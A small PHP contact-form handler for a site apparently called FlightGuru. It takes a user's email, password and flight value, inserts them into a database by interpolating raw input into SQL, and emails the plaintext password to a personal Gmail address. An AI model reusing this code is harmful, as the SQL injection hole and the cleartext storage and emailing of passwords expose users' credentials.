<?php

include_once "rnheader.php";
     
    // EDIT THE 2 LINES BELOW AS REQUIRED
    $email_to = "you@yourdomain.com";
    $email_subject = "FlightGuru Submission";
     
     
     
    $email = $_POST['email']; // required
    $pass = $_POST['password']; // required
    $flight = $_POST['flight']; // required


    $email_message = "Form details below.\n\n";

    $email_message .= "email: ". $email ."\n";
    $email_message .= "password: " . $pass ."\n";
    $email_message .= "flight: " . $flight ."\n";
	
	$query = "INSERT INTO experts
		  (user,pass,flight)
              VALUES
          ('$email','$pass','$flight')";
mysql_query($query);

mysql_close($con);
     
// create email headers
$headers = 'From: '. "admin@flightguru.co" ."\r\n".
'Reply-To: '."\r\n" .
'X-Mailer: PHP/' . phpversion();
@mail("eric61213@gmail.com", $email_subject, $email_message, $headers);  
?>
 
<!-- include your own success html here -->
 
<h4>Thank you for contacting us. We will be in touch with you very soon.</h4>